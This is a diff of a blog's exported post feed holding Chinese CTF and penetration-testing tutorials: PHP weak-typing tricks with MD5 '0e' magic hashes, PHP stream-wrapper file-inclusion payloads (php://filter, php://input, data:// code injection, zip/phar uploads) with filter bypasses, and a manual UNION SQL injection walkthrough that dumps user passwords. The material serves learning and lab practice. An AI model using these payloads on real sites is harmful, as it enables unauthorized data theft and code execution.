-<p>如果该字符串没有包含’.’,’e’,’E’并且其数值值在整形的范围之内<br>该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0</p>
-<p>a = 1 + “10.5”  //a = 11.5<br>b = 1 + “-1.1e3” //a = -1099<br>c = 1 + “ab123”   //c = 1<br>d = 1+”2ab”    //d = 3</p>
-<p>MD5绕过<br>0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0</p>
-<p>QNKCDZO<br>0e830400451993494058024219903391</p>
-<p>s878926199a<br>0e545993274517709034328855841020</p>
-<p>s155964671a<br>0e342768416822451524974117254469</p>
-<p>s214587387a<br>0e848240448830537924465865611904</p>
-<p>s214587387a<br>0e848240448830537924465865611904</p>
-<p>s878926199a<br>0e545993274517709034328855841020</p>
-<p>s1091221200a<br>0e940624217856561557816327384675</p>
-<p>s1885207154a<br>0e509367213418206700842008763514</p>
-]]></content>
-      <categories>
-        <category>PHP</category>
-      </categories>
-      <tags>
-        <tag>php</tag>
       </tags>
   </entry>
   <entry>
@@ -1677,6 +1590,93 @@
 <p>访问：<a href="http://127.0.0.1/test5.php?per_serialized=O:4:%22read%22:1:{s:8:%22filename%22;s:5:%222.txt%22;}" target="_blank" rel="noopener">http://127.0.0.1/test5.php?per_serialized=O:4:%22read%22:1:{s:8:%22filename%22;s:5:%222.txt%22;}</a></p>
 <p><img src="http://pp64r48ul.bkt.clouddn.com/5.png" alt="在这里插入图片描述"></p>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过上面的学习，我们知道，要想找到一个php漏洞，需要先找到可控的反序列化函数，通过这些反序列化函数，我们去调用一些类，这些类中可能会包含一些魔法函数，在这些魔法函数中可能会有一些我们可控的危险操作，从而触发了php反序列化漏洞。</p>
+]]></content>
+      <categories>
+        <category>PHP</category>
+      </categories>
+      <tags>
+        <tag>php</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>php伪协议</title>
+    <url>/posts/3072.html</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>PHP伪协议在CTF中经常出现，也经常跟文件包含，文件上传，命令执行等漏洞结合在一起，所以本文章对常见的一些协议进行总结。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file:&#x2F;&#x2F; — 访问本地文件系统</span><br><span class="line">http:&#x2F;&#x2F; — 访问 HTTP(s) 网址</span><br><span class="line">ftp:&#x2F;&#x2F; — 访问 FTP(s) URLs</span><br><span class="line">php:&#x2F;&#x2F; — 访问各个输入&#x2F;输出流（I&#x2F;O streams</span><br><span class="line">zlib:&#x2F;&#x2F; — 压缩流</span><br><span class="line">data:&#x2F;&#x2F; — 数据（RFC 2397）</span><br><span class="line">glob:&#x2F;&#x2F; — 查找匹配的文件路径模式</span><br><span class="line">phar:&#x2F;&#x2F; — PHP 归档</span><br><span class="line">ssh2:&#x2F;&#x2F; — Secure Shell 2</span><br><span class="line">rar:&#x2F;&#x2F; — RAR</span><br><span class="line">ogg:&#x2F;&#x2F; — 音频流</span><br><span class="line">expect:&#x2F;&#x2F; — 处理交互式的流</span><br></pre></td></tr></table></figure>
+
+<p><strong>今天着重研究php://</strong></p>
+<p>有两个比较重要的配置在<code>php.ini</code>中，<code>allow_url_fopen</code> 和<br><code>allow_url_include</code>会影响到<code>fopen</code>等等和<code>include</code>等等函数对于伪协<br>议的支持，而<code>allow_url_include</code>依赖<code>allow_url_fopen</code>，所以<br><code>allow_url_fopen</code>不开启的话，<code>allow_url_include</code>也是无法使用的。</p>
+<h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p><code>php://input</code>代表可以访问请求的原始数据，简单来说<code>POST</code>请求的情况下，<code>php://input</code>可以获取到post的数据。</p>
+<ul>
+<li><strong>使用条件：include()、include_once()、file_get_contents()</strong></li>
+</ul>
+<p>比较特殊的一点，<code>enctype=”multipart/form-data”</code> 的时候 php://input 是无效的。</p>
+<h3 id="php-output"><a href="#php-output" class="headerlink" title="php://output"></a>php://output</h3><p>php://output 是一个只写的数据流，允许你以 <code>print</code> 和 <code>echo</code> 一样的方式写入到输出缓冲区。</p>
+<h3 id="php-filter-重点"><a href="#php-filter-重点" class="headerlink" title="php://filter(重点)"></a>php://filter(重点)</h3><p>这篇文章的关键在于讨论<code>php://filte</code>r,事实上，这也是我们常常使用的一个伪协议，在任意文件读取，甚至getshell的时候都有利用的机会。</p>
+<p><code>php://filter</code> 是一种元封装器， 设计用于数据流打开时的筛选过滤应用，也就是作为一种过滤器，可以使用在数据流产生的地方。</p>
+<p>这对于一体式（all-in-one）的文件函数非常有用，类似 <code>readfile()</code>、 <code>file()</code> 和 <code>file_get_contents()</code>， 在数据流内容读取之前没有机会应用其他过滤器。</p>
+<p>事实上，在<code>include</code>函数的使用上，经常会造成任意文件读取漏洞，而<code>file_get_contents()</code>和<code>file_put_contents()</code>这样函数下，常常会构成getshell等更严重的漏洞。</p>
+<h2 id="URL中包含点的常见形式"><a href="#URL中包含点的常见形式" class="headerlink" title="URL中包含点的常见形式"></a>URL中包含点的常见形式</h2><ul>
+<li><p><code>?file = xxx 或者 ?file = xxx.php</code></p>
+<p>那么源码中的写法：</p>
+<p><code>include($file.&#39;php&#39;) 或者 include($file)</code></p>
+<p>这里直接使用伪协议包含：</p>
+<p><code>?file=php://filter/read=convert.base64-encode/resource=login</code></p>
+</li>
+<li><p><code>?action = xxx &amp; mode = xxx</code></p>
+<p>这里形式就是文件夹加上文件名的方法</p>
+<p><code>http://www.example.com/index.php?action=front&amp;mode=login</code></p>
+<p>那么源码中的写法：</p>
+<p><code>include($action.&#39;/&#39;.$mode.&#39;.php&#39;);</code></p>
+<p>那么对于这种情况使用的伪协议包含形式：</p>
+<p><code>?action=php://filter/read=convert.base64-encode/resource=./&amp;mode=login</code></p>
+</li>
+</ul>
+<h2 id="举个例子"><a href="#举个例子" class="headerlink" title="举个例子"></a>举个例子</h2><p>题目链接：<a href="http://level3.tasteless.en/" target="_blank" rel="noopener">http://level3.tasteless.en/</a></p>
+<p>题目直接给出了源码：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(&#39;index.php&#39;);</span><br><span class="line">&#x2F;*</span><br><span class="line">view file: php.ini</span><br><span class="line">so here is my hint: the included php.ini file is part of the configugartion file used on the server the bug was found.</span><br><span class="line">so there will be something in it which enables you to solve this level, wont?</span><br><span class="line"></span><br><span class="line">always be UP TO DATE!</span><br><span class="line"></span><br><span class="line">hint enough, might just take you seconds to do?!</span><br><span class="line">*&#x2F;</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&#39;anti_rfi.php&#39;); &#x2F;&#x2F;rfi is forbidden!!!!!</span><br><span class="line"></span><br><span class="line">$inc &#x3D; @$_GET[&#39;file&#39;];</span><br><span class="line">@require_once($inc);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>用php://input直接就能执行任意代码<br><img src="/posts/3072/%E4%BC%AA%E5%8D%8F%E8%AE%AE1.jpg" alt></p>
+<h3 id="绕过waf的方法"><a href="#绕过waf的方法" class="headerlink" title="绕过waf的方法"></a>绕过waf的方法</h3><p>在一些ctf中会对一些伪协议的关键词进行过滤，如read、resource等等，下面总结了几条绕过方法，在实战总作为字典来跑。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?f&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;login.php（过滤了操作名read）</span><br><span class="line"></span><br><span class="line">?f&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;1.jpg&#x2F;resource&#x3D;.&#x2F;show.php（正则 &#x2F;resource&#x3D;*.jpg&#x2F;i）</span><br><span class="line"></span><br><span class="line">?f&#x3D;data:text&#x2F;plain,&lt;?php phpinfo()?&gt;</span><br><span class="line"></span><br><span class="line">?file&#x3D;data:text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</span><br></pre></td></tr></table></figure>
+
+<h2 id="截断包含"><a href="#截断包含" class="headerlink" title="截断包含"></a>截断包含</h2><h3 id="截断"><a href="#截断" class="headerlink" title="截断"></a>截断</h3><p>这里技巧现在应该是用的比较少了，因为利用截断要满足下面的两个条件：</p>
+<ul>
+<li><p>php版本小于5.3.4</p>
+</li>
+<li><p>magic_quotes_gpc为off</p>
+</li>
+</ul>
+<h3 id="截断-1"><a href="#截断-1" class="headerlink" title="./ 截断"></a>./ 截断</h3><p>点号和路径截断以及./截断，也就是填充大量的./使url长度超过最大值，来达到截断的目的。</p>
+<p>具体可以看下面的文章：<a href="https://blog.csdn.net/zvall/article/details/8951925" target="_blank" rel="noopener">https://blog.csdn.net/zvall/article/details/8951925</a> </p>
+<h2 id="zip协议和phar协议"><a href="#zip协议和phar协议" class="headerlink" title="zip协议和phar协议"></a>zip协议和phar协议</h2><p>在实战过程中，若发现存在文件上传但是没有办法直接上传php文件，可以传zip压缩文件，我们就利用这两个协议，将php文件打包成zip文件来包含里面的php脚本。</p>
+<p>phar://、zip://，都可以看到在phpinfo中有相应的描述。</p>
+<p>例如脚本文件为1.php，打包成1.zip，然后再改名为1.jpg，上传之后包含1.jpg中的php文件即可。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zip:&#x2F;&#x2F;..（当前脚本的绝对路径）...&#x2F;1.jpg#1.php</span><br><span class="line">phar:&#x2F;&#x2F;...（当前脚本的绝对路径）...&#x2F;1.jpg&#x2F;1（分割不加后缀名）</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>PHP</category>
+      </categories>
+      <tags>
+        <tag>php</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>php弱类型</title>
+    <url>/posts/21181.html</url>
+    <content><![CDATA[<p>弱类型</p>
+<p>比较：<br>=== 强等于 ：先判断两种字符串的类型，再比较<br>==  弱等于 ：先将字符串类型转换成相同，再比较</p>
+<a id="more"></a>
+<p>如果一个数值和字符串进行比较的时候，会将字符串转换成数值<br>Abc == 0<br>1abc == 1<br>Abc1 == 0<br>0e123 == 0e456 //0e被识别为科学计数法</p>
+<p>如果该字符串没有包含’.’,’e’,’E’并且其数值值在整形的范围之内<br>该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0</p>
+<p>a = 1 + “10.5”  //a = 11.5<br>b = 1 + “-1.1e3” //a = -1099<br>c = 1 + “ab123”   //c = 1<br>d = 1+”2ab”    //d = 3</p>
+<p>MD5绕过<br>0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0</p>
+<p>QNKCDZO<br>0e830400451993494058024219903391</p>
+<p>s878926199a<br>0e545993274517709034328855841020</p>
+<p>s155964671a<br>0e342768416822451524974117254469</p>
+<p>s214587387a<br>0e848240448830537924465865611904</p>
+<p>s214587387a<br>0e848240448830537924465865611904</p>
+<p>s878926199a<br>0e545993274517709034328855841020</p>
+<p>s1091221200a<br>0e940624217856561557816327384675</p>
+<p>s1885207154a<br>0e509367213418206700842008763514</p>
 ]]></content>
       <categories>
         <category>PHP</category>
@@ -1810,6 +1810,87 @@
       </tags>
   </entry>
   <entry>
+    <title>sql注入之手工注入</title>
+    <url>/posts/42669.html</url>
+    <content><![CDATA[<p><img src="/posts/42669/sql1.png" alt></p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>手工注入虽然原理是一样的，但是在具体手工注入的过程中有好多各种各样的细节不太一样，特此记录汇总下，以方便以后的学习查询。</p>
+<a id="more"></a>
+<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="注释或闭合语句"><a href="#注释或闭合语句" class="headerlink" title="注释或闭合语句"></a>注释或闭合语句</h3><p>首先看下一个基本的SQL语句查询源码：</p>
+<p><strong><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code></strong></p>
+<p><img src="/posts/42669/sql2.jpg" alt><br>下面的步骤默认都是采用这种基本的SQL语句的，其他的注入方法换汤不换药，这里只是想整理下注入的步骤与关键性的语句。</p>
+<h3 id="引导闭合语句"><a href="#引导闭合语句" class="headerlink" title="引导闭合语句"></a>引导闭合语句</h3><p><code>id =1 &#39; and &#39;1&#39; =&#39;1</code></p>
+<p>带入进源码中的SQL语句就是:</p>
+<p><code>SELECT * FROM users WHERE id=&#39;1 &#39; and &#39;1&#39; = &#39;1&#39; LIMIT 0,1</code></p>
+<h3 id="注释后面语句"><a href="#注释后面语句" class="headerlink" title="注释后面语句"></a>注释后面语句</h3><p>常用的注释payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">or 1&#x3D;1--+</span><br><span class="line">&#39;or 1&#x3D;1--+</span><br><span class="line">&quot;or 1&#x3D;1--+</span><br><span class="line">)or 1&#x3D;1--+</span><br><span class="line">&#39;)or 1&#x3D;1--+</span><br><span class="line">&quot;) or 1&#x3D;1--+</span><br><span class="line">&quot;))or 1&#x3D;1--+</span><br><span class="line">--+ 可以用#替换，url 提交过程中 Url 编码后的#为%23</span><br></pre></td></tr></table></figure>
+
+<p>带入进源码中的SQL语句就是:</p>
+<p><code>SELECT * FROM users WHERE id=&#39;&#39;or 1=1--+&#39; LIMIT 0,1</code></p>
+<p>这样可以看出直接把后面的语句都给注释掉了，一般实战用注释比较多。</p>
+<h3 id="and验证"><a href="#and验证" class="headerlink" title="and验证"></a>and验证</h3><p>当然这里 and 验证和 or 验证都可以，二者区别不大:</p>
+<p><strong>页面返回正常</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; and 1&#x3D;1 --+</span><br><span class="line">?id&#x3D;1&#39; or 1&#x3D;2 --+</span><br></pre></td></tr></table></figure>
+<p><strong>页面返回异常</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; and 1&#x3D;2 --+</span><br><span class="line">?id&#x3D;1&#39; or 1&#x3D;1 --+</span><br></pre></td></tr></table></figure>
+
+<p>如果发现一开始页面先是正常然后是异常的话，说明页面啊存在注入。当然这里是最基本的判断方法，到后面盲注的时候是用延时函数来观察页面的返回时间的。</p>
+<h3 id="查询字段数目"><a href="#查询字段数目" class="headerlink" title="查询字段数目"></a>查询字段数目</h3><p>查询字段数目主要利用MySQL里面的 order by 来判断字段数目，order by一般采用数学中的对半查找来判断具体的字段数目，这样效率会很高，下面假设用 order by 来判断一个未知字段的注入。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; order by 1 –-+ 此时页面正常，继续换更大的数字测试</span><br><span class="line">?id&#x3D;1&#39; order by 10 –-+ 此时页面返回错误，更换小的数字测试</span><br><span class="line">?id&#x3D;1&#39; order by 5 –-+ 此时页面依然报错，继续缩小数值测试</span><br><span class="line">?id&#x3D;1&#39; order by 3 –-+ 此时页面返回正常，更换大的数字测试</span><br><span class="line">?id&#x3D;1&#39; order by 4 –-+ 此时页面返回错误，3正常，4错误，说明字段数目就是 3</span><br></pre></td></tr></table></figure>
+<p>通过数学的对半查找，确定字段数目。</p>
+<h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p>UNION SELECT 联合查询，手工注入经典语句，作用是在后面通过UNION把我们的恶意注入语句接上去，带入数据库进行查询。<br>因为字段数目是:3,那么正规的语句如下:</p>
+<p><code>?id=1&#39; UNION SELECT 1,2,3 --+</code></p>
+<p>这里页面是不会报错的，此时我们带入数据库的语句为:</p>
+<p><code>SELECT 1,2,3 这段语句没有任何意义，所以页面按返回正常。</code><br><img src="/posts/42669/sql3.jpg" alt="union查询"><br>但是为了信息收集，我们得知道当前这个页面里面的值，调用的具体是数据库中的哪个字段才可以，可以故意构造一个错误的语句，来爆出错误的字段：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;-1&#39; UNION SELECT 1,2,3 –-+ 通过id&#x3D;-1 一个负数不存在的id值来触发报错</span><br><span class="line">id&#x3D;1&#39; and 1&#x3D;2 UNION SELECT 1,2,3 –-+ 通过and 1&#x3D;2 语句来触发报错</span><br><span class="line">id&#x3D;1&#39; or 1&#x3D;1 UNION SELECT 1,2,3 –-+ 通过or 1&#x3D;1 语句来触发报错</span><br></pre></td></tr></table></figure>
+
+<h3 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h3><p>在爆出的字段值里面可以<code>替换</code>为我们的恶意语句，前期主要是收集信息，包括判断当前数据库是否是root用户，MySQL的版本等，一般收集这些信息常用一些MySQL自带的函数去收集信息:</p>
+<p><strong>MySQL常用的系统函数:</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">version()            #MySQL版本</span><br><span class="line">user()               #数据库用户名</span><br><span class="line">database()           #数据库名</span><br><span class="line">@@datadir            #数据库路径</span><br><span class="line">@@version_compile_os #操作系统版本</span><br></pre></td></tr></table></figure>
+
+<p><strong>查询当前数据库名</strong></p>
+<p><code>id=1&#39; and 1=2 UNION SELECT 1,database(),3 --+</code></p>
+<p><img src="/posts/42669/sql4.jpg" alt><br><strong>查询MySQL版本</strong></p>
+<p><code>id=1&#39; and 1=2 UNION SELECT 1,2,version() --+</code></p>
+<p><img src="/posts/42669/sql5.jpg" alt><br><strong>查询数据库用户和路径</strong></p>
+<p><code>id=1&#39; and 1=2 UNION SELECT 1,user(),@@datadir --+</code></p>
+<p><img src="/posts/42669/sql6.jpg" alt></p>
+<h3 id="查询数据库"><a href="#查询数据库" class="headerlink" title="查询数据库"></a>查询数据库</h3><p>查询数据库，一般来说我们注入的时候要查的就是当前的数据库，但有时候root权限就NB了还可以看到网站数据库之外的数据库内容。</p>
+<p><strong>查询当前数据库</strong></p>
+<p><code>id=1&#39; and 1=2 UNION SELECT 1,2,database() --+</code></p>
+<p><img src="/posts/42669/sql7.jpg" alt><br>拿到当前的数据库名称为:<code>security</code></p>
+<p><strong>查询所有数据库</strong><br>有时候忍不住想看下其他的数据库的内容，可以用这个语句查询所有的数据库:</p>
+<p><code>id=1&#39; and 1=2 UNION SELECT 1,2,group_concat(schema_name) from information_schema.schemata --+</code></p>
+<p><img src="/posts/42669/sql8.jpg" alt></p>
+<h3 id="查询表名"><a href="#查询表名" class="headerlink" title="查询表名"></a>查询表名</h3><p><strong>database 查询数据库</strong></p>
+<p><code>id=1&#39; and 1=2 UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</code></p>
+<p><img src="/posts/42669/sql9.jpg" alt><br><strong>单引号-数据库</strong><br>这里的<code>database()</code>函数进行了数据库查询，因为我们已经查到了当前的数据库为<code>security</code>，所有这里还可以酱紫写，用单引号括把数据库的名称括起来<code>&#39;security&#39;</code>:</p>
+<p><code>id=1&#39; and 1=2 UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39; --+</code><br><img src="/posts/42669/sql10.jpg" alt><br><strong>hex编码数据库</strong><br>如果嫌单引号括起来麻烦的话，那么巧了！这里还有一个更麻烦的方法，就是将数据库名进行<code>hex</code>编码处理。<br>使用火狐自带的<code>HackBar</code>插件可以快速的进行<code>hex</code>编码:<br><img src="/posts/42669/sql11.gif" alt></p>
+<p>hex编码后在前面加上0x表明这里是16进制编码。</p>
+<p><img src="/posts/42669/sql12.jpg" alt></p>
+<h3 id="查询列名"><a href="#查询列名" class="headerlink" title="查询列名"></a>查询列名</h3><p>目前收集到的信息为:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">数据库名称: securuty</span><br><span class="line">数据库表名: emails,referers,uagents,users</span><br></pre></td></tr></table></figure>
+<p>这几个表中 一般我们都会去 继续猜解<code>users</code>表。</p>
+<p><code>id=1&#39; and 1=2 UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; --+</code></p>
+<p><img src="/posts/42669/sql13.jpg" alt></p>
+<h3 id="查询字段值"><a href="#查询字段值" class="headerlink" title="查询字段值"></a>查询字段值</h3><p>知道了数据库、表名、各个字段名可以直接进行查询了，不需借助<code>information_schanem</code>数据库了。</p>
+<p><code>id=1&#39; and 1=2 UNION SELECT 1,2,group_concat(id,username,password) from users --+</code></p>
+<p><img src="/posts/42669/sql14.jpg" alt></p>
+<h2 id="简单整理"><a href="#简单整理" class="headerlink" title="简单整理"></a>简单整理</h2><p><code>order by –-+ 判断字段数目</code></p>
+<p><code>union select –-+ 联合查询收集信息</code></p>
+<p><code>id=1&#39; and 1=2 UNION SELECT 1,2,database() –-+ 查询当前数据库</code></p>
+<p><code>id=1&#39; and 1=2 UNION SELECT 1,2,group_concat(schema_name) from information_schema.schemata –-+查询所有数据库</code></p>
+<p><code>id=1&#39; and 1=2 UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() –-+ 查询表名</code></p>
+<p><code>id=1&#39; and 1=2 UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name=’users’ –-+ 查询列名</code></p>
+<p><code>id=1&#39; and 1=2 UNION SELECT 1,2,group_concat(id,username,password) from users –-+ 查询字段值</code></p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>sqlmap的基本使用</title>
     <url>/posts/8141.html</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>sqlmap也是渗透中常用的一个注入工具，据说，在注入工具方面，一个sqlmap就足够用了，只要你用的熟，秒杀各种工具，只是一个便捷性问题，sql注入另一方面就是手工党了，这个就另当别论了。今天我把一些SQLmap的使用整理一下。</p>
@@ -1938,127 +2019,6 @@ tablename -C &quot;password&quot; --dump</code></p>
       </tags>
   </entry>
   <entry>
-    <title>sql注入之手工注入</title>
-    <url>/posts/42669.html</url>
-    <content><![CDATA[<p><img src="/posts/42669/sql1.png" alt></p>
-<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>手工注入虽然原理是一样的，但是在具体手工注入的过程中有好多各种各样的细节不太一样，特此记录汇总下，以方便以后的学习查询。</p>
-<a id="more"></a>
-<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="注释或闭合语句"><a href="#注释或闭合语句" class="headerlink" title="注释或闭合语句"></a>注释或闭合语句</h3><p>首先看下一个基本的SQL语句查询源码：</p>
-<p><strong><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code></strong></p>
-<p><img src="/posts/42669/sql2.jpg" alt><br>下面的步骤默认都是采用这种基本的SQL语句的，其他的注入方法换汤不换药，这里只是想整理下注入的步骤与关键性的语句。</p>
-<h3 id="引导闭合语句"><a href="#引导闭合语句" class="headerlink" title="引导闭合语句"></a>引导闭合语句</h3><p><code>id =1 &#39; and &#39;1&#39; =&#39;1</code></p>
-<p>带入进源码中的SQL语句就是:</p>
-<p><code>SELECT * FROM users WHERE id=&#39;1 &#39; and &#39;1&#39; = &#39;1&#39; LIMIT 0,1</code></p>
-<h3 id="注释后面语句"><a href="#注释后面语句" class="headerlink" title="注释后面语句"></a>注释后面语句</h3><p>常用的注释payload：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">or 1&#x3D;1--+</span><br><span class="line">&#39;or 1&#x3D;1--+</span><br><span class="line">&quot;or 1&#x3D;1--+</span><br><span class="line">)or 1&#x3D;1--+</span><br><span class="line">&#39;)or 1&#x3D;1--+</span><br><span class="line">&quot;) or 1&#x3D;1--+</span><br><span class="line">&quot;))or 1&#x3D;1--+</span><br><span class="line">--+ 可以用#替换，url 提交过程中 Url 编码后的#为%23</span><br></pre></td></tr></table></figure>
-
-<p>带入进源码中的SQL语句就是:</p>
-<p><code>SELECT * FROM users WHERE id=&#39;&#39;or 1=1--+&#39; LIMIT 0,1</code></p>
-<p>这样可以看出直接把后面的语句都给注释掉了，一般实战用注释比较多。</p>
-<h3 id="and验证"><a href="#and验证" class="headerlink" title="and验证"></a>and验证</h3><p>当然这里 and 验证和 or 验证都可以，二者区别不大:</p>
-<p><strong>页面返回正常</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; and 1&#x3D;1 --+</span><br><span class="line">?id&#x3D;1&#39; or 1&#x3D;2 --+</span><br></pre></td></tr></table></figure>
-<p><strong>页面返回异常</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; and 1&#x3D;2 --+</span><br><span class="line">?id&#x3D;1&#39; or 1&#x3D;1 --+</span><br></pre></td></tr></table></figure>
-
-<p>如果发现一开始页面先是正常然后是异常的话，说明页面啊存在注入。当然这里是最基本的判断方法，到后面盲注的时候是用延时函数来观察页面的返回时间的。</p>
-<h3 id="查询字段数目"><a href="#查询字段数目" class="headerlink" title="查询字段数目"></a>查询字段数目</h3><p>查询字段数目主要利用MySQL里面的 order by 来判断字段数目，order by一般采用数学中的对半查找来判断具体的字段数目，这样效率会很高，下面假设用 order by 来判断一个未知字段的注入。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; order by 1 –-+ 此时页面正常，继续换更大的数字测试</span><br><span class="line">?id&#x3D;1&#39; order by 10 –-+ 此时页面返回错误，更换小的数字测试</span><br><span class="line">?id&#x3D;1&#39; order by 5 –-+ 此时页面依然报错，继续缩小数值测试</span><br><span class="line">?id&#x3D;1&#39; order by 3 –-+ 此时页面返回正常，更换大的数字测试</span><br><span class="line">?id&#x3D;1&#39; order by 4 –-+ 此时页面返回错误，3正常，4错误，说明字段数目就是 3</span><br></pre></td></tr></table></figure>
-<p>通过数学的对半查找，确定字段数目。</p>
-<h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p>UNION SELECT 联合查询，手工注入经典语句，作用是在后面通过UNION把我们的恶意注入语句接上去，带入数据库进行查询。<br>因为字段数目是:3,那么正规的语句如下:</p>
-<p><code>?id=1&#39; UNION SELECT 1,2,3 --+</code></p>
-<p>这里页面是不会报错的，此时我们带入数据库的语句为:</p>
-<p><code>SELECT 1,2,3 这段语句没有任何意义，所以页面按返回正常。</code><br><img src="/posts/42669/sql3.jpg" alt="union查询"><br>但是为了信息收集，我们得知道当前这个页面里面的值，调用的具体是数据库中的哪个字段才可以，可以故意构造一个错误的语句，来爆出错误的字段：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;-1&#39; UNION SELECT 1,2,3 –-+ 通过id&#x3D;-1 一个负数不存在的id值来触发报错</span><br><span class="line">id&#x3D;1&#39; and 1&#x3D;2 UNION SELECT 1,2,3 –-+ 通过and 1&#x3D;2 语句来触发报错</span><br><span class="line">id&#x3D;1&#39; or 1&#x3D;1 UNION SELECT 1,2,3 –-+ 通过or 1&#x3D;1 语句来触发报错</span><br></pre></td></tr></table></figure>
-
-<h3 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h3><p>在爆出的字段值里面可以<code>替换</code>为我们的恶意语句，前期主要是收集信息，包括判断当前数据库是否是root用户，MySQL的版本等，一般收集这些信息常用一些MySQL自带的函数去收集信息:</p>
-<p><strong>MySQL常用的系统函数:</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">version()            #MySQL版本</span><br><span class="line">user()               #数据库用户名</span><br><span class="line">database()           #数据库名</span><br><span class="line">@@datadir            #数据库路径</span><br><span class="line">@@version_compile_os #操作系统版本</span><br></pre></td></tr></table></figure>
-
-<p><strong>查询当前数据库名</strong></p>
-<p><code>id=1&#39; and 1=2 UNION SELECT 1,database(),3 --+</code></p>
-<p><img src="/posts/42669/sql4.jpg" alt><br><strong>查询MySQL版本</strong></p>
-<p><code>id=1&#39; and 1=2 UNION SELECT 1,2,version() --+</code></p>
-<p><img src="/posts/42669/sql5.jpg" alt><br><strong>查询数据库用户和路径</strong></p>
-<p><code>id=1&#39; and 1=2 UNION SELECT 1,user(),@@datadir --+</code></p>
-<p><img src="/posts/42669/sql6.jpg" alt></p>
-<h3 id="查询数据库"><a href="#查询数据库" class="headerlink" title="查询数据库"></a>查询数据库</h3><p>查询数据库，一般来说我们注入的时候要查的就是当前的数据库，但有时候root权限就NB了还可以看到网站数据库之外的数据库内容。</p>
-<p><strong>查询当前数据库</strong></p>
-<p><code>id=1&#39; and 1=2 UNION SELECT 1,2,database() --+</code></p>
-<p><img src="/posts/42669/sql7.jpg" alt><br>拿到当前的数据库名称为:<code>security</code></p>
-<p><strong>查询所有数据库</strong><br>有时候忍不住想看下其他的数据库的内容，可以用这个语句查询所有的数据库:</p>
-<p><code>id=1&#39; and 1=2 UNION SELECT 1,2,group_concat(schema_name) from information_schema.schemata --+</code></p>
-<p><img src="/posts/42669/sql8.jpg" alt></p>
-<h3 id="查询表名"><a href="#查询表名" class="headerlink" title="查询表名"></a>查询表名</h3><p><strong>database 查询数据库</strong></p>
-<p><code>id=1&#39; and 1=2 UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</code></p>
-<p><img src="/posts/42669/sql9.jpg" alt><br><strong>单引号-数据库</strong><br>这里的<code>database()</code>函数进行了数据库查询，因为我们已经查到了当前的数据库为<code>security</code>，所有这里还可以酱紫写，用单引号括把数据库的名称括起来<code>&#39;security&#39;</code>:</p>
